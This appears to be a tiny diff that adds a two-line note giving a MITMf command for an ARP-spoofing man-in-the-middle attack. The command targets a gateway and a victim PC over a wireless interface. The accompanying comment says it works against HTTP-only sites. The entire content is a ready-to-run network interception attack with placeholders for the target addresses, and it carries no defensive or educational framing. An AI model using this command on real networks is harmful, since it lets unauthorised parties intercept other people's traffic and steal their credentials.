@@ -1,0 +1,2 @@
+: Command to start mtmf attack only for http sites can be byepassed :
+mitmf --arp --spoof --gateway (ap-ip) --target (IP address of the target pc) -i wlan0 
